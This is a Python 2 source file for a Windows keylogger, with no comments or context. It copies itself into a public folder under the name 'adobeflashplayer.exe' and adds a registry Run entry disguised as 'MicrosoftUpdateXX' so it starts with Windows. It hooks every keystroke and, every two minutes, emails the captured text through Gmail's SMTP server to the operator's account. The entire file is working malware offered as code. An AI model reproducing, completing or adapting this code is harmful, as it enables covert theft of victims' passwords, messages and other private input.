import pythoncom
import pyHook
from os import path
from sys import exit
import threading
import urllib,urllib2
import smtplib
import datetime,time
import win32com.client
import win32event, win32api, winerror
from _winreg import *
import shutil
import sys

ironm = win32event.CreateMutex(None, 1, 'NOSIGN')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    ironm = None
    print "nope"
    sys.exit(0)

x, data, count= '', '', 0

dir = r"C:\Users\Public\Libraries\adobeflashplayer.exe"

def startup():
    shutil.copy(sys.argv[0], dir)
    aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
    aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
    SetValueEx(aKey,"MicrosoftUpdateXX", 0, REG_SZ, dir)	
if not path.isfile(dir):
    startup()	

class Timer(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.event = threading.Event()
    def run(self):
        while not self.event.is_set():
            global data
            if len(data) > 50:
                ts = datetime.datetime.now()
                SERVER = "smtp.gmail.com"
                PORT = 587
                USER = EEMAIL
                PASS = EPASS
                FROM = USER
                TO = [USER]
                SUBJECT = "B33: "+str(ts) 
                MESSAGE =  data 
                message = """\ 
From: %s
To: %s
Subject: %s
%s
""" % (FROM, ", ".join(TO), SUBJECT, MESSAGE)
                try:
                    server = smtplib.SMTP()
                    server.connect(SERVER, PORT)
                    server.starttls()
                    server.login(USER, PASS)
                    server.sendmail(FROM, TO, message)
                    data = ''
                    server.quit()
                except Exception as error:
                    print error
            self.event.wait(120)

def main():
    global x
    em4 = Timer()
    em4.start()
    return True

if __name__ == '__main__':
    main()

def pushing(event):
    global x,data
    if event.Ascii == 13:
        kkss=' [ENTER] '
    elif event.Ascii == 8:
        kkss=' [BACKSPACE] '
    elif (event.Ascii == 162 or event.Ascii == 163):
        kkss = ' [CTRL] '
    elif (event.Ascii == 164 or event.Ascii == 165):
        kkss = ' [ALT] '
    elif (event.Ascii == 160 or event.Ascii == 161):
        kkss = ' [SHIFT] '
    elif (event.Ascii == 46):
        kkss = ' [DELETE] '
    elif (event.Ascii == 32):
        kkss = ' [SPACE] '
    elif (event.Ascii == 27):
        kkss = ' [ESC] '
    elif (event.Ascii == 9):
        kkss = ' [TAB] '
    elif (event.Ascii == 20):
        kkss = ' [CAPSLOCK] '
    elif (event.Ascii == 38):
        kkss = ' [UP] '
    elif (event.Ascii == 40):
        kkss = ' [DOWN] '
    elif (event.Ascii == 37):
        kkss = ' [LEFT] '
    elif (event.Ascii == 39):
        kkss = ' [RIGHT] '
    elif (event.Ascii == 91):
        kkss = ' [SUPER] '
    else:
        kkss=chr(event.Ascii)
    data=data+kkss 
    
hee = pyHook.HookManager()
hee.KeyDown = pushing
hee.HookKeyboard()
pythoncom.PumpMessages()
